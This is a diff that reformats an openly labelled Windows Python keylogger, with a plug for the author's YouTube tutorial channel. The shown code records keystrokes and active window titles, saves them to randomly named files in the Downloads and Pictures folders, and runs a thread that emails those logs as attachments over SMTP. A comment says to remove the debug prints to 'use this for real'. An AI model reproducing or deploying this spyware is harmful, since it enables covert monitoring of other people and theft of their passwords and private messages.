@@ -1,13 +1,14 @@
-#//python keylogging program
+# //python keylogging program
 
-## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
-## i have prints on here that will tell you and let you know what part of the program is going at the time and that it is 
-## working 
+# You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
+# i have prints on here that will tell you and let you know what part of the program is going at the time and that it is
+# working
 
 # Surport me and subscribe to my YouTube tutorial channel - https://bit.ly/2U58Lt9 / link also in my description. Thanks.
 
-#imports
-from pynput.keyboard import Key,Listener
+# i mports
+
+from pynput.keyboard import Key, Listener
 import win32gui
 import os
 import time
@@ -43,21 +44,20 @@ def on_press(key):
 
 	if new_app == 'Cortana':
 		new_app = 'Windows Start Menu'
+
 	else:
 		pass
-	
-	
+
 	if new_app != old_app and new_app != '':
 		logged_data.append(f'[{datetime}] ~ {new_app}\n')
 		old_app = new_app
 	else:
 		pass
 
-
 	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
-	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
-	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
-	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
+	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
+	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
+	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
 	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
 
 	key = str(key).strip('\'')
@@ -70,16 +70,18 @@ def on_press(key):
 def write_file(count):
 	one = os.path.expanduser('~') + '/Downloads/'
 	two = os.path.expanduser('~') + '/Pictures/'
-	#three = 'C:/'
-	list = [one,two]
+
+	# three = 'C:/'
+
+	list = [one, two]
 
 	filepath = random.choice(list)
-	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
+	filename = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
 	file = filepath + filename
 	delete_file.append(file)
 
 
-	with open(file,'w') as fp:
+	with open(file, 'w') as fp:
 		fp.write(''.join(logged_data))
 	print('written all good')
 
@@ -93,8 +95,10 @@ def send_logs():
 
 	MIN = 10
 	SECONDS = 60
-	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log
-	time.sleep(30) # for debugging ~ yes program works :)
+
+	# time.sleep(MIN * SECONDS) # every 10 mins write file/send log
+
+	time.sleep(30)  # for debugging ~ yes program works :)
 	while True:
 		if len(logged_data) > 1:
 			try:
@@ -107,17 +111,17 @@ def send_logs():
 				msg['To'] = toAddr
 				msg['Subject'] = subject
 				body = 'testing'
-				msg.attach(MIMEText(body,'plain'))
+				msg.attach(MIMEText(body, 'plain'))
 
-				attachment = open(delete_file[0],'rb')
+				attachment = open(delete_file[0], 'rb')
 				print('attachment')
 
 				filename = delete_file[0].split('/')[2]
 
-				part = MIMEBase('application','octect-stream')
+				part = MIMEBase('application', 'octect-stream')
 				part.set_payload((attachment).read())
 				encoders.encode_base64(part)
-				part.add_header('content-disposition','attachment;filename='+str(filename))
+				part.add_header('content-disposition', 'attachment;filename='+str(filename))
 				msg.attach(part)
 
 				text = msg.as_string()
@@ -128,8 +132,8 @@ def send_logs():
 				s.starttls()
 				print('starttls')
 				s.ehlo()
-				s.login(fromAddr,fromPswd)
-				s.sendmail(fromAddr,toAddr,text)
+				s.login(fromAddr, fromPswd)
+				s.sendmail(fromAddr, toAddr, text)
 				print('sent mail')
 				attachment.close()
 				s.close()
@@ -146,12 +150,9 @@ def send_logs():
 				pass
 
 
-
-
-if __name__=='__main__':
+if __name__ == '__main__':
 	T1 = threading.Thread(target=send_logs)
 	T1.start()
 
 	with Listener(on_press=on_press) as listener:
 		listener.join()
-
